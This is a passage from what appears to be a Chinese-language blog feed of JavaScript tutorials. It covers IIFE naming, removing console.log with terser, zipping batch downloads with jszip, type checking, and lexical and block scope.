<span class="token function">addPrefix</span><span class="token punctuation">(</span><span class="token string">"con"</span><span class="token punctuation">,</span> <span class="token string">"verse"</span><span class="token punctuation">,</span> <span class="token string">"vex"</span><span class="token punctuation">)</span>
<span class="token comment">// prefixedWords = ["converse", "convex"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ES6：函数作为对象属性的快捷语法"><a href="#ES6：函数作为对象属性的快捷语法" class="headerlink" title="ES6：函数作为对象属性的快捷语法"></a>ES6：函数作为对象属性的快捷语法</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    name<span class="token operator">:</span> <span class="token string">"Wallace"</span><span class="token punctuation">,</span>
    <span class="token function-variable function">bark</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">"Woof!"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 上述对象写法等效于</span>
<span class="token keyword">const</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    name<span class="token operator">:</span> <span class="token string">"Wallace"</span><span class="token punctuation">,</span>
    <span class="token function">bark</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">"Woof!"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="具名立即调用函数表达式（具名IIFE）对自身再赋值"><a href="#具名立即调用函数表达式（具名IIFE）对自身再赋值" class="headerlink" title="具名立即调用函数表达式（具名IIFE）对自身再赋值"></a>具名立即调用函数表达式（具名IIFE）对自身再赋值</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// a是函数</span>
    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// a被赋值为1</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// a是函数表达式</span>
    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 这句不执行，无效</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// function a()&#123;...&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>IIFE是函数表达式，不是函数</li>
<li>函数表达式与函数不同，函数表达式的函数名只在函数内部生效，且绑定为一个常数</li>
<li>对一个常数再赋值，在严格模式下报错，在非严格模式下赋值语句无效</li>
</ol>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript使用terser打包时自动去除console.log</title>
    <url>/2019/08/12/javascript%E4%BD%BF%E7%94%A8terser%E6%89%93%E5%8C%85%E6%97%B6%E8%87%AA%E5%8A%A8%E5%8E%BB%E9%99%A4console-log/</url>
    <content><![CDATA[<h2 id="terser"><a href="#terser" class="headerlink" title="terser"></a>terser</h2><p>由于老牌工具uglify不支持es6，且uglify-es不再更新，我们选择terser作为js代码压缩工具。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 全局安装terser命令行工具</span>
<span class="token function">npm</span> <span class="token function">install</span> -g terser
<span class="token comment"># 使用terser</span>
terser ./foo.js -c <span class="token assign-left variable">pure_funcs</span><span class="token operator">=</span><span class="token punctuation">[</span>console.log<span class="token punctuation">]</span>,toplevel<span class="token operator">=</span>true -m -o bar.js
<span class="token comment"># -c即compress表示普通的压缩代码</span>
<span class="token comment"># pure_funcs表示删除代码中的console.log方法</span>
<span class="token comment"># toplevel为true表示只在顶级作用域压缩清理变量</span>
<span class="token comment"># -m即mangle会压缩变量名等等</span>
<span class="token comment"># -o代表输出路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其他配置可以参考terser官网</p>
<h2 id="terser-webpack-plugin"><a href="#terser-webpack-plugin" class="headerlink" title="terser-webpack-plugin"></a>terser-webpack-plugin</h2><p>这是terser的webpack插件版。由于vue-cli工具中已经用到了terser-webpack-plugin，因此在vue-cli新建的项目中可以直接引入terser-webpack-plugin，无需安装。</p>
<p>根据vue-cli3文档，所有对webpack的个性化配置都要写在vue.config.js中，示例如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// vue.config.js</span>
<span class="token keyword">const</span> TerserPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"terser-webpack-plugin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  configureWebpack<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    minimizer<span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token keyword">new</span> <span class="token class-name">TerserPlugin</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        terserOptions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
          compress<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            pure_funcs<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"console.log"</span><span class="token punctuation">]</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>terser</tag>
        <tag>uglify</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript前端批量下载文件并打包为zip</title>
    <url>/2021/05/25/javascript%E5%89%8D%E7%AB%AF%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%93%E5%8C%85%E4%B8%BAzip/</url>
    <content><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>后端提供了下载单个文件的接口，返回数据类型为 blob，现在要在没有额外后端接口的条件下，前端批量下载多个文件并打包生成 zip，供客户下载。</p>
<h2 id="需要安装的依赖与需要前置了解的知识"><a href="#需要安装的依赖与需要前置了解的知识" class="headerlink" title="需要安装的依赖与需要前置了解的知识"></a>需要安装的依赖与需要前置了解的知识</h2><ul>
<li><p>需要用到 jszip 库，安装<code>npm install jszip</code></p>
</li>
<li><p>在 for 循环中使用异步，使所有请求并发，并在最终等所有请求结束后遍历（了解 Promise.all、Promise.allSettled、for await of）</p>
</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token comment">// 引入jszip库</span>
<span class="token keyword">import</span> jszip <span class="token keyword">from</span> <span class="token string">"jszip"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">downloadAndZipAll</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 创建a标签，用于最终的zip下载</span>
  <span class="token keyword">const</span> ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 新建zip实例</span>
  <span class="token keyword">const</span> zip <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">jszip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 根据所有文件id请求所有文件blob</span>
  <span class="token comment">// selectedDocument为选中的多个要下载的文件对象</span>
  <span class="token keyword">const</span> allPromise <span class="token operator">=</span> selectedDocuments<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// downloadDocument为根据文件id请求blob数据的Promise函数</span>
    <span class="token keyword">return</span> <span class="token function">downloadDocument</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>document_id<span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> blob<span class="token operator">:</span> Blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>res<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// 定义blob的类型，这里为docx类型</span>
          type<span class="token operator">:</span> <span class="token string">"application/vnd.openxmlformats-officedocument.wordprocessingml.document"</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 返回包含文档信息与blob的新对象，文档信息用于后面为文档命名</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> blob<span class="token punctuation">,</span> <span class="token operator">...</span>document <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">// 若请求报错则返回null，用于将文件载入zip时，防止某一请求报错而导致无法生成zip</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// ES8的for await语法，需要在async函数中使用，用于待所有请求有结果后，遍历放入zip文件中</span>
  <span class="token keyword">for</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> allPromise<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 若请求未报错，则返回值不为null，可将文档放入zip包</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">)</span>
      <span class="token comment">// 将文件放入zip包，第一个参数为文件名，第二个参数为文档的blob数据</span>
      zip<span class="token punctuation">.</span><span class="token function">file</span><span class="token punctuation">(</span>
        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">dayjs</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>make_time<span class="token punctuation">,</span> <span class="token string">"YYYY-MM-DD HH:mm"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"YYYY-MM-DD"</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>item<span class="token punctuation">.</span>product_name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.docx</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
        item<span class="token punctuation">.</span>blob
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// 除了使用for await语法外还可以使用Promise.all或Promise.allSettled</span>
  <span class="token comment">// Promise.all若有一个请求报错，则Promise.all被中断，进入catch中，但若是在每一个单一请求中已做过错误处理，则不会进入catch</span>
  <span class="token comment">// Promise.allSettled不论请求是否报错，只要响应了，就会返回</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> <span class="token keyword">await</span> <span class="token builtin">Promise</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span>allPromise<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 若请求未报错，则返回值不为null，可将文档放入zip包</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">)</span>
      <span class="token comment">// 将文件放入zip包，第一个参数为文件名，第二个参数为文档的blob数据</span>
      zip<span class="token punctuation">.</span><span class="token function">file</span><span class="token punctuation">(</span>
        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">dayjs</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>make_time<span class="token punctuation">,</span> <span class="token string">"YYYY-MM-DD HH:mm"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"YYYY-MM-DD"</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>item<span class="token punctuation">.</span>product_name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.docx</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
        item<span class="token punctuation">.</span>blob
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// await所有文件放入zip包后，生成zip的blob，供用户下载</span>
  zip<span class="token punctuation">.</span><span class="token function">generateAsync</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> type<span class="token operator">:</span> <span class="token string">"blob"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 使用blob创建访问链接</span>
    ele<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 模拟鼠标点击</span>
    ele<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 释放访问链接</span>
    <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span>ele<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考资料</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise">Promise MDN</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25743960">Promise.all 错误处理</a></p>
<p><a href="https://www.zhangxinxu.com/wordpress/2019/08/js-zip-download/">纯前端 JSzip 打包文件并下载-张鑫旭</a></p>
<p><a href="https://stuk.github.io/jszip/documentation/api_jszip.html">JSzip 官方文档 API</a></p>
<p><a href="https://stackoverflow.com/questions/37576685/using-async-await-with-a-foreach-loop">Using async/await with a forEach loop</a></p>
<p><a href="https://stackoverflow.com/questions/59694309/for-await-of-vs-promise-all">for await of VS Promise.all</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>Promise.all</tag>
        <tag>Promise.allSettled</tag>
        <tag>for await of</tag>
        <tag>jszip</tag>
        <tag>下载</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript判断类型</title>
    <url>/2018/11/18/javascript%E5%88%A4%E6%96%AD%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="javascript判断类型"><a href="#javascript判断类型" class="headerlink" title="javascript判断类型"></a>javascript判断类型</h1><h2 id="typeof运算符"><a href="#typeof运算符" class="headerlink" title="typeof运算符"></a>typeof运算符</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">typeof</span> <span class="token string">"a"</span><span class="token punctuation">;</span> <span class="token comment">// "string"</span>
<span class="token keyword">typeof</span> a<span class="token punctuation">;</span> <span class="token comment">// "undefined" 未声明变量</span>
<span class="token keyword">typeof</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// "number"</span>
<span class="token keyword">typeof</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// "function"</span>
<span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">// "function"</span>
<span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "undefined"</span>
<span class="token keyword">typeof</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "undefined"</span>
<span class="token keyword">typeof</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span> <span class="token comment">// "undefined"</span>
<span class="token keyword">typeof</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// "object"</span>
<span class="token keyword">typeof</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "object"</span>
<span class="token keyword">typeof</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// "object"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过上面的例子可以看出typeof运算符可以判断出除了null、array外的基本类型，IIFE则以return的值为准，无return语句就是默认return了undefined</p>
<h2 id="instanceof运算符"><a href="#instanceof运算符" class="headerlink" title="instanceof运算符"></a>instanceof运算符</h2><p>instanceof运算符用于测试构造函数的prototype属性是否出现在对象的原型链中的任何位置，这样就可以区分Array与Object</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h2><p>还有一种方法就是利用对象的constructor属性，也可以区分Array和Object</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array<span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="ES6中新增了Array-isArray-方法来判断是否为数组"><a href="#ES6中新增了Array-isArray-方法来判断是否为数组" class="headerlink" title="ES6中新增了Array.isArray()方法来判断是否为数组"></a>ES6中新增了Array.isArray()方法来判断是否为数组</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>类型</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript作用域</title>
    <url>/2018/03/20/javascript%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
    <content><![CDATA[<p>在一些语言中，声明和定义存在明确的区分。声明一个变量仅指给它指定一个标志符来宣称它的存在。而定义则代表声明后还要进行赋值。<br>在javascript中，声明和定义是可以互换的概念。因为所有变量都会在声明之后给定一个值。如果你没有显式赋值，会自动给定一个隐含值undefined。</p>
<h1 id="静态作用域"><a href="#静态作用域" class="headerlink" title="静态作用域"></a>静态作用域</h1><p>javascript使用静态作用域。静态作用域又称词法作用域，静态作用域下函数作用域在定义（声明）时已经确定，如未找到自身作用域内的变量，则沿作用域链向上，在上级作用域中查找，直到全局。</p>
<span id="more"></span>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出2 详见下面的说明</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>静态作用域：<br>foo的作用域在声明时就已经确定，当foo被调用时，在foo自身的作用域中找不到变量a，此时以定义foo时的作用域链为准，向作用域链上级查找。foo定义时的作用域链为：foo作用域——全局作用域。而在全局作用域中存在a = 2，故输出结果为2。</p>
<p>动态作用域：<br>如果是动态作用域，foo的作用域在foo被调用时确定，作用域链向上是foo被调用时的环境。在foo的作用域中找不到a，则沿作用域链向上，在foo被调用的环境即bar的作用域中查找，bar中a = 3，故在动态作用域规则下应输出3，而js使用静态作用域，只能输出2。</p>
<p>总结：在函数中遇到既不是形参也不是函数内部定义的局部变量的变量时，静态作用域下是去函数定义时的环境中查询，动态作用域下是去函数调用时的环境中查询。</p>
<p>在函数中定义的参数和声明的局部变量，其作用域范围仅在函数内部，当函数调用完毕，参数与局部变量都会被销毁。</p>
<h1 id="作用域、上下文、执行环境"><a href="#作用域、上下文、执行环境" class="headerlink" title="作用域、上下文、执行环境"></a>作用域、上下文、执行环境</h1><p><strong>作用域（scope）</strong>：编译过程中，负责收集并维护所有声明的标志符，确定当前执行代码对这些标志符的访问权限的一套规则。简而言之作用域就是变量的可见性。</p>
<p><strong>上下文（context）</strong>：函数调用时的this值。this来自执行环境对象。</p>
<p>P.S. new关键字调用函数时，上下文this被设置为被调用的函数实例，即新构造的对象。</p>
<p>严格模式调用函数，上下文this为undefined。（详见<a href="/2018/03/15/javascript%E5%85%B3%E9%94%AE%E5%AD%97this/" title="js关键字this">js关键字this</a>）</p>
<p>__执行环境（Execution context）__：执行环境又称执行上下文，当代码流转到可执行代码时，会进入一个执行环境，执行环境有创建和执行两个阶段。创建时会创建一个执行环境对象，其中包含作用域链，变量对象与上下文。<br>当前所有执行环境构成一个栈，栈底部始终是全局环境，顶部是当前活动的执行环境，随执行流的变化，执行环境入栈或出栈。全局环境的执行环境对象就是window对象。</p>
<h1 id="块作用域"><a href="#块作用域" class="headerlink" title="块作用域"></a>块作用域</h1><p>ES6前只有函数作用域和全局作用域，ES6中添加了块作用域。块是由一对花括号括起来的一系列语句。块作用域指的就是那些仅仅在代码块内有效的变量。块通常是控制流语句的一部分，如if或for，定义独立的块也是合法的。ES6中let与const关键字声明的变量处在块作用域中，var声明的变量在代码块外也可以访问到。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined 块内变量提升，相当于只声明，未赋值。</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 相当于已经声明只进行赋值</span>
    <span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">// 块内声明只在块内生效，这里块内声明的变量屏蔽了块外变量，块内无法访问块外变量</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2 undefined 赋值为2</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2 块外也能访问var声明的变量</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1 块外访问不到块内变量bar，只能访问到块外的变量bar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="变量屏蔽"><a href="#变量屏蔽" class="headerlink" title="变量屏蔽"></a>变量屏蔽</h1><p>使用let或const在块作用域外与块作用域内声明相同名字的变量，块内声明的变量会屏蔽块外的，使块外的变量不可访问。这个特性可以防止变量污染。函数作用域同理。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    objName<span class="token operator">:</span> <span class="token string">"foo"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> foo<span class="token punctuation">;</span>
<span class="token keyword">const</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5 外部foo变量屏蔽，访问不到</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bar<span class="token punctuation">.</span>objName<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// foo </span>
    bar<span class="token punctuation">.</span>objName <span class="token operator">=</span> <span class="token string">"bar"</span><span class="token punctuation">;</span> <span class="token comment">// 对象为引用型值，本身并不构成作用域，虽然在块中修改，但是在全局都生效</span>
